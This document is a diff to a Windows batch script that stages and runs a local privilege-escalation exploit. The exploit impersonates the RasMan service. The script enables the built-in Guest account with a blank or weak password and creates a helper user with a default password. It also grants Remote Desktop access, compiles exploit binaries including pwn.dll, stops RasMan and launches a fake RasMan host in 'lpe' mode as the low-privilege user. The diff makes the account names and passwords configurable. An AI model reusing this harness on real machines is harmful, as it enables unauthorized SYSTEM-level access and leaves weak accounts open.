@@ -5,6 +5,14 @@ cd /d C:\Users\Public\Desktop\EXPLOIT
 
 echo [+] Starting administrative setup
 echo [+] Working directory: C:\Users\Public\Desktop\EXPLOIT
+echo.
+
+set "HELPER_USER=guestlab"
+set /p INPUT_HELPER_USER=[?] Low-priv helper username [guestlab]: 
+if defined INPUT_HELPER_USER set "HELPER_USER=%INPUT_HELPER_USER%"
+set /p HELPER_PASSWORD=[?] Password for %HELPER_USER% [password]: 
+if not defined HELPER_PASSWORD set "HELPER_PASSWORD=password"
+set /p GUEST_PASSWORD=[?] Built-in Guest password [blank]: 
 
 set "VSDEVCMD="
 if exist "C:\Program Files\Microsoft Visual Studio\18\Community\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files\Microsoft Visual Studio\18\Community\Common7\Tools\VsDevCmd.bat"
@@ -13,8 +21,12 @@ if not defined VSDEVCMD if exist "C:\Program Files\Microsoft Visual Studio\2022\
 if not defined VSDEVCMD if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"
 
 if not defined VSDEVCMD (
-    echo [!] Could not find VsDevCmd.bat
-    echo [!] Install Visual Studio C++ build tools or edit this script with the correct path
+    echo [!] Could not find VsDevCmd.bat automatically
+    set /p VSDEVCMD=[?] Enter the full path to VsDevCmd.bat: 
+)
+
+if not exist "%VSDEVCMD%" (
+    echo [!] VsDevCmd.bat was not found at: %VSDEVCMD%
     exit /b 1
 )
 
@@ -25,16 +37,16 @@ if errorlevel 1 (
     exit /b 1
 )
 
-echo [+] Enabling built-in Guest and setting lab passwords
+echo [+] Enabling built-in Guest and applying account settings
 net user Guest /active:yes
-net user Guest password
-net user guestlab >nul 2>&1
+net user Guest "%GUEST_PASSWORD%"
+net user %HELPER_USER% >nul 2>&1
 if errorlevel 1 (
-    echo [+] Creating low-priv helper user guestlab
-    net user guestlab password /add
+    echo [+] Creating low-priv helper user %HELPER_USER%
+    net user %HELPER_USER% "%HELPER_PASSWORD%" /add
 ) else (
-    echo [+] Updating password for existing guestlab
-    net user guestlab password
+    echo [+] Updating password for existing %HELPER_USER%
+    net user %HELPER_USER% "%HELPER_PASSWORD%"
 )
 net localgroup "Remote Desktop Users" Guest /add >nul 2>&1
 
@@ -48,7 +60,7 @@ if errorlevel 1 (
 echo [+] Building exploit binaries
 cl /nologo /EHsc /std:c++17 /W3 /O2 /MT exploit_host2.cpp /link /out:exploit_host2.exe
 if errorlevel 1 exit /b 1
-cl /nologo /W3 /O2 /MT /LD /DUNICODE /D_UNICODE pwn.c /link advapi32.lib /out:pwn.dll
+cl /nologo /W3 /O2 /MT /LD /DUNICODE /D_UNICODE /DHELPER_USER=\"%HELPER_USER%\" pwn.c /link advapi32.lib /out:pwn.dll
 if errorlevel 1 exit /b 1
 cl /nologo /W3 /O2 /MT signal_event.c /link /out:signal_event.exe
 if errorlevel 1 exit /b 1
@@ -64,7 +76,7 @@ cl /nologo /W3 /O2 /MT query_shared_connection.c /link rasapi32.lib /out:query_s
 if errorlevel 1 exit /b 1
 
 echo [+] Resetting old proof files and process state
-net localgroup Administrators guestlab /delete >nul 2>&1
+net localgroup Administrators %HELPER_USER% /delete >nul 2>&1
 taskkill /IM exploit_host2.exe /F >nul 2>&1
 del /f /q system.txt load.txt group_add.txt squatter.log >nul 2>&1
 
@@ -72,10 +84,10 @@ echo [+] Preparing service state
 sc stop RasMan >nul 2>&1
 sc start RasAuto >nul 2>&1
 
-echo [+] Starting the fake RasMan host as low-priv guestlab
-launch_guest.exe "C:\Users\Public\Desktop\EXPLOIT\exploit_host2.exe --mode lpe"
+echo [+] Starting the fake RasMan host as low-priv %HELPER_USER%
+launch_guest.exe --user "%HELPER_USER%" --password "%HELPER_PASSWORD%" "C:\Users\Public\Desktop\EXPLOIT\exploit_host2.exe --mode lpe"
 if errorlevel 1 (
-    echo [!] Failed to start exploit_host2.exe as guestlab
+    echo [!] Failed to start exploit_host2.exe as %HELPER_USER%
     exit /b 1
 )
 
